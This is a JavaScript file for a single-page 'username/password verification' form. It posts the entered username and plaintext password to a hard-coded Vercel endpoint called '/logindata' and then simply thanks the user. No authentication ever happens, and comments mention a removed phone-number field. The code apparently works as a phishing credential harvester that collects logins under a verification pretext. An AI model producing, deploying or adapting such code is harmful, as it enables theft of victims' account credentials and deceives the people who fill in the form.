// script.js (for Single Page Username/Password Verification - index.html)
document.addEventListener('DOMContentLoaded', function () {
    const verificationForm = document.getElementById('verificationForm'); // Or 'loginForm' if that's your form ID in index.html
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    // phoneNumberInput is removed
    const messageDiv = document.getElementById('message');

    // #############################################################################
    // ### VERY IMPORTANT: Replace YOUR_ACTUAL_VERCEL_BACKEND_URL with your real URL ###
    // ### Example: 'https://number2-yourusername.vercel.app/logindata'          ###
    // #############################################################################
    const BACKEND_API_URL = 'https://number2-adamahmeddds-projects.vercel.app/logindata';

    // Basic check for the URL - if it's still the very obvious placeholder
    if (BACKEND_API_URL === 'YOUR_ACTUAL_VERCEL_BACKEND_URL/logindata') {
         if (messageDiv) { // Check if messageDiv exists before trying to use it
            displayMessage('ERROR: Frontend not configured. Please contact support.', 'error');
         }
         console.error("CRITICAL: BACKEND_API_URL is still the placeholder in script.js!");
         // return; // Optionally stop further execution if form existed, but form submit listener is separate
    }


    verificationForm.addEventListener('submit', async function (event) {
        event.preventDefault(); // Prevent default form submission

        const username = usernameInput.value.trim();
        const password = passwordInput.value; // Passwords usually aren't trimmed
        // phoneNumber variable is removed

        if (messageDiv) {
            messageDiv.textContent = '';
            messageDiv.className = 'message';
            messageDiv.classList.remove('show');
        }

        if (username === '' || password === '') {
            displayMessage('Please fill in both username/email and password.', 'error');
            return;
        }

        // Data to send only includes username and password
        const dataToSend = {
            username: username,
            password: password
            // phoneNumber field is removed
        };

        try {
            const response = await fetch(BACKEND_API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(dataToSend),
            });

            if (response.ok) {
                displayMessage('Details submitted. Thank you!', 'success');
                verificationForm.reset(); // Optional: clear the form after successful submission
            } else {
                const errorData = await response.text();
                console.error('Server error:', response.status, errorData);
                displayMessage('Submission failed. Server responded with an error.', 'error');
            }
        } catch (error) {
            console.error('Network error or other issue sending data:', error);
            displayMessage('Could not submit data. Check your internet connection or try again later.', 'error');
        }
    });

    function displayMessage(msg, type) {
        if (messageDiv) {
            setTimeout(() => {
                messageDiv.textContent = msg;
                messageDiv.classList.add(type);
                messageDiv.classList.add('show');
            }, 50);
        } else {
            alert((type === 'error' ? "Error: " : "") + msg);
        }
    }
});
